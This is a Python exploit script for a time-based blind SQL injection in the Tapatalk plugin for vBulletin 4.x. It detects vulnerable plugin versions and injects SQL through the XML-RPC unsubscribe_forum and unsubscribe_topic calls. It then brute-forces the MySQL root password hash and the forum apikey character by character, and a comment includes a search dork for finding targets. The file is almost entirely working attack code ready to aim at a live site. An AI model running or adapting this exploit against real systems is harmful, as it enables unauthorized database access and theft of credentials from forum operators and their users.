#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
@author: tintinweb 0x721427D8
'''
import urllib2, urllib
import xmlrpclib,re, urllib2,string,itertools,time
from distutils.version import LooseVersion


class Exploit(object):
    def __init__(self, target, debug=0 ):
        self.stopwatch_start=time.time()
        self.target = target
        self.path = target
        self.debug=debug
        if not self.target.endswith("mobiquo.php"):
            self.path = self.detect_tapatalk()
            if not self.path:
                raise Exception("Could not detect tapatalk or version not supported!")
        self.rpc_connect()
        self.attack_func = self.attack_2

    def detect_tapatalk(self):
        # request page, check for tapatalk banner
        handlers = [
                    urllib2.HTTPHandler(debuglevel=self.debug),
                    urllib2.HTTPSHandler(debuglevel=self.debug),

                    ]
        ua = urllib2.build_opener(*handlers)
        ua.addheaders = [('User-agent', 'Mozilla/5.0 (iPhone; CPU iPhone OS 5_0 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9A334 Safari/7534.48.3')]
        data = ua.open(self.target).read()
        if self.debug:
            print data
        if not "tapatalkDetect()" in data:
            print "[xx] could not detect tapatalk. bye..."
            return None
            
        # extract tapatalk version
        print "[ i] Taptalk detected ... ",
        path = "".join(re.findall(r"^\s*<link href=[\s'\"]?(http://.*?/)smartbanner/appbanner.css", data, re.MULTILINE|re.DOTALL))
        path+="mobiquo.php"
        print "'%s' ... "%path,
        data = urllib.urlopen(path).read()
        version = "".join(re.findall(r"Current Tapatalk plugin version:\s*([\d\.a-zA-Z]+)", data))
        if LooseVersion(version) <= LooseVersion("5.2.1"):
            print "v.%s  :) - OK"%version    
            return path
        print "v.%s :( - not vulnerable"%version
        return None
    
    def rpc_connect(self):
        self.rpc = xmlrpclib.ServerProxy(self.path,verbose=self.debug)
        
    def attack_1(self, sqli, sleep=2):
        
        '''
        SELECT subscribethreadid
                    FROM subscribethread AS subscribethread
                    LEFT JOIN user AS user ON (user.userid=subscribeforum.userid)
                    WHERE subscribethreadid = <INJECTION>
                      AND subscribethreadid.userid = 0";
                      
        <INJECTION>: 1 UNION ALL <select_like_probe> OR FALSE
        '''
        
        query = "-1 union %s and  (  select sleep(%s)   )  "%(sqli,sleep)
        query += "union select subscribethreadid from subscribethread  where 1=1 OR 1=1"          # fix query for "AND subscribeforum.userid=0"
        
        if self.debug:
            print """  SELECT subscribethreadid
                    FROM subscribethread AS subscribethread
                    LEFT JOIN user AS user ON (user.userid=subscribethread.userid)
                    WHERE subscribethreadid = %s
                      AND subscribethread.userid = 0"""%query
        
        return self.rpc.unsubscribe_topic("s_%s"%query)   #no escape, invalid_char="_"
    
    def attack_2(self, sqli, sleep=2):
        '''
        SELECT subscribeforumid
                    FROM subscribeforum AS subscribeforum
                    LEFT JOIN user AS user ON (user.userid=subscribeforum.userid)
                    WHERE subscribeforumid = <INJECTION>
                      AND subscribeforum.userid = 0";
                      
        <INJECTION>: 1 UNION ALL <select_like_probe> OR FALSE
        '''
        
        query = "-1 union %s and  (  select sleep(%s)   )  "%(sqli,sleep)
        query += "union select subscribeforumid from subscribeforum  where 1=1 OR 1=1"          # fix query for "AND subscribeforum.userid=0"
        
        if self.debug:
            print """  SELECT subscribeforumid
                    FROM subscribeforum AS subscribeforum
                    LEFT JOIN user AS user ON (user.userid=subscribeforum.userid)
                    WHERE subscribeforumid = %s
                      AND subscribeforum.userid = 0"""%query
                      
        return self.rpc.unsubscribe_forum("s_%s"%query)   #no escape, invalid_char="_"
        
    def attack_blind(self,sqli,sleep=2):
        return self.attack_func(sqli,sleep=sleep)
        #return self.attack_func("-1 OR subscribethreadid = ( %s AND (select sleep(4)) )  UNION SELECT 'aaa' FROM subscribethread  WHERE subscribethreadid = -1 OR 1 "%sqli)
        
    def attack_blind_guess(self,query, column, charset=string.ascii_letters+string.digits,maxlength=32, sleep=2, case=True):
        '''
        provide <query> = select -1 from user where user='debian-sys-maint' where <COLUMN> <GUESS>
        '''


        hit = False
        # PHASE 1 - guess entry length
        print "[    ] trying to guess length ..."
        for guess_length in xrange(maxlength+1):
            q = query.replace("<COLUMN>","length(%s)"%column).replace("<GUESS>","= %s"%guess_length)
            
            self.stopwatch()
            self.attack_blind(q, sleep)
            duration = self.stopwatch()
            
            print ".",
            
            if  duration >= sleep-sleep/8:
                # HIT! - got length! => guess_length
                hit = True
                print ""
                break
        
        if not hit:
            print "[ !!] unable to guess password length, check query!"
            return None
        
        
        print "[  *] LENGTH = %s"%guess_length
        
        # PHASE 2 - guess password up to length
        print "[    ] trying to guess value  ..."
        hits = 0
        result = ""
        for pos in xrange(guess_length):
            # for each char pos in up to guessed length
            for attempt in self.bruteforce(charset, 1):
                # probe all chars in charset
                #attempt = re.escape(attempt)
                if attempt == "%%":
                    attempt= "\%"
                #LIKE binary = case sensitive.might be better to do caseinsensitive search + recheck case with binary
                q = query.replace("<COLUMN>",column).replace("<GUESS>","LIKE '%s%s%%' "%(result,attempt))
            
                self.stopwatch()
                self.attack_blind(q, sleep)
                duration = self.stopwatch()
            
                #print result,attempt,"  ",duration
                print ".",
                if  duration >= sleep-sleep/8:
                    if case:
                        # case insensitive hit - recheck case: this is drastically reducing queries needed.
                        q = query.replace("<COLUMN>",column).replace("<GUESS>","LIKE binary '%s%s%%' "%(result,attempt.lower()))
                        self.stopwatch()
                        self.attack_blind(q, sleep)
                        duration = self.stopwatch()
                        if  duration >= sleep-sleep/8:
                            attempt = attempt.lower()
                        else:
                            attempt = attempt.upper()
                        # case sensitive - end
                        
                    
                    
                    # HIT! - got length! => guess_length
                    hits += 1
                    print ""
                    print "[  +] HIT! - %s[%s].."%(result,attempt)
                    result += attempt
                    break     
                
        if not hits==guess_length:
            print "[ !!] unable to guess password length, check query!"
            return None
        
        print "[  *] SUCCESS!: query: %s"%(query.replace("<COLUMN>",column).replace("<GUESS>","='%s'"%result)) 
        return result   
    
    def bruteforce(self, charset, maxlength):
        return (''.join(candidate)
            for candidate in itertools.chain.from_iterable(itertools.product(charset, repeat=i)
            for i in range(1, maxlength + 1)))
        
    def stopwatch(self):
        stop = time.time()
        diff = stop - self.stopwatch_start
        self.stopwatch_start=stop
        return diff
        
if __name__=="__main__":
    #googledork:  https://www.google.at/search?q=Tapatalk+Banner+head+start
    DEBUG = False
    TARGET = "http://TARGET/vbb4/forum.php"
    x = Exploit(TARGET,debug=DEBUG)

    print "[   ] TAPATALK for vBulletin 4.x - SQLi"
    print "[--] Target: %s"%TARGET
    if DEBUG: print "[--] DEBUG-Mode!" 
    
    print "[ +] Attack - sqli"


    query = u"-1  UNION SELECT 1%s"%unichr(0)
    if DEBUG:
        print u"""  SELECT subscribeforumid
                FROM subscribeforum AS subscribeforum
                LEFT JOIN user AS user ON (user.userid=subscribeforum.userid)
                WHERE subscribeforumid = %s
                  AND subscribeforum.userid = 0"""%query


    print "[ *] guess mysql user/pass"
    print x.attack_blind_guess("select -1 from mysql.user where user='root' and <COLUMN> <GUESS>", 
                               column="password",
                               charset="*"+string.hexdigits,
                               maxlength=45)        # usually 40 chars + 1 (*)
    
    print "[ *] guess apikey"
    print x.attack_blind_guess("select -1 from setting where varname='apikey' and <COLUMN> <GUESS>",
                               column='value',
                               charset=string.ascii_letters+string.digits,
                               maxlength=14,
                               )

    print "-- done --"



